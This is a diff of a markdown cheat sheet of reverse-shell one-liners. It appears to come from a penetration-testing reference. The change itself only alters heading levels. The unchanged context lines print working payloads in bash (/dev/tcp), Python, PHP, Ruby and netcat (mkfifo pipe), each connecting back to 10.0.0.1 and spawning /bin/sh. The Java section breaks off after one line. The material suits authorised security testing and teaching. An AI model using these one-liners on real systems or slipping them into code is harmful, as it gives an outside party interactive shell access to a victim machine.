@@ -8,7 +8,7 @@ Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/b
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-## PERL
+## Perl
 
 Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):
 
@@ -26,7 +26,7 @@ This was tested under Linux / Python 2.7:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-#### PHP
+## PHP
 
 This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
 
@@ -36,13 +36,13 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
 
-#### Ruby
+## Ruby
 
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-#### Netcat
+## Netcat
 
 Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
 
@@ -56,7 +56,7 @@ If you have the wrong version of netcat installed, [Jeff Price points out here](
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
-#### Java
+## Java
 
 ```java
 r = Runtime.getRuntime()
